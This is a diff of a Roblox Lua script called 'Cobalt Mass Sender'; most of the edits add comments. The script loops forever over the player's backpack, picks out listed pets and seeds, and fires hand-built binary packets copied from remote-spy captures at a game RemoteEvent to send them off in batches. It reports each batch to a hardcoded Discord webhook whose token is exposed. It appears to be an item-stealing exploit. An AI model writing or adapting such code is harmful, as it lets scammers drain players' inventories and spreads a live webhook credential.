@@ -1,13 +1,13 @@
--- Dynamic Mass Sender (only selected items)
+-- Cobalt Mass Sender – dynamically builds payloads from backpack attributes
 local ALLOWED_PETS = {"Robin"}
-local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
+local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Carrot","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
 
 local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
 local player = game:GetService("Players").LocalPlayer
 local backpack = player:WaitForChild("Backpack")
 
--- Quick lookup
+-- Quick lookup tables
 local petLookup = {}
 for _, p in ipairs(ALLOWED_PETS) do petLookup[p:lower()] = true end
 local seedLookup = {}
@@ -28,20 +28,20 @@ local function sendWebhook(msg)
     end
 end
 
--- Builds one item block exactly as the working Cobalt calls
+-- Builds a single item block matching Cobalt's exact binary format
 local function buildItemBlock(itemKey, count, category)
     return table.concat({
-        "\x1C",
-        "\v\aItemKey",
+        "\x1C",                             -- opening tag
+        "\v\aItemKey",                      -- key: "ItemKey" (length 7)
         "\v" .. string.char(#itemKey) .. itemKey,
-        "\v\x05Count",
-        "\x05" .. string.char(count),
-        "\v\bCategory",
+        "\v\x05Count",                      -- key: "Count"
+        "\x05" .. string.char(count),       -- int value
+        "\v\bCategory",                     -- key: "Category" (length 8)
         "\v" .. string.char(#category) .. category
     })
 end
 
--- Verified headers from Cobalt (single vs multi)
+-- Verified headers from working Cobalt spy captures
 local HEADER_SINGLE = "!\x01\x18\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01"
 local HEADER_MULTI  = "!\x01\x33\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
 
@@ -54,6 +54,7 @@ while true do
     -- Scan for allowed seeds and pets (max 20 per batch)
     for _, item in ipairs(items) do
         if #queue >= 20 then break end
+        
         local mainCat = item:GetAttribute("MainCategory")
         if mainCat == "Seed" then
             local seedName = item:GetAttribute("SeedTool")
@@ -71,7 +72,7 @@ while true do
             local petId = item:GetAttribute("PetId")
             if petName and petId and petLookup[petName:lower()] then
                 table.insert(queue, {
-                    key = "$" .. petId,
+                    key = "$" .. petId,     -- pet identifier: "$" + UUID
                     count = 1,
                     category = "Pets",
                     instance = item
@@ -85,18 +86,18 @@ while true do
         break
     end
 
-    -- Choose correct header and build payload
+    -- Choose the correct header
     local header = (#queue == 1) and HEADER_SINGLE or HEADER_MULTI
     local payload = header
     for i, itemData in ipairs(queue) do
         if i > 1 then
-            payload = payload .. "\x00\x05" .. string.char(i)
+            payload = payload .. "\x00\x05" .. string.char(i)   -- separator + index
         end
         payload = payload .. buildItemBlock(itemData.key, itemData.count, itemData.category)
     end
-    payload = payload .. "\x00\x00\x00"
+    payload = payload .. "\x00\x00\x00"   -- terminator
 
-    -- Fire the remote (no client deletion)
+    -- Fire the remote (no client‑side destruction)
     if Event then
         Event:FireServer(buffer.fromstring(payload))
     end
@@ -108,6 +109,6 @@ while true do
     end
     sendWebhook("⚡ **Batch fired (" .. #queue .. " items):**\n" .. table.concat(logLines, "\n"))
 
-    -- 12-second cooldown
+    -- 12‑second cooldown
     task.wait(12)
 end
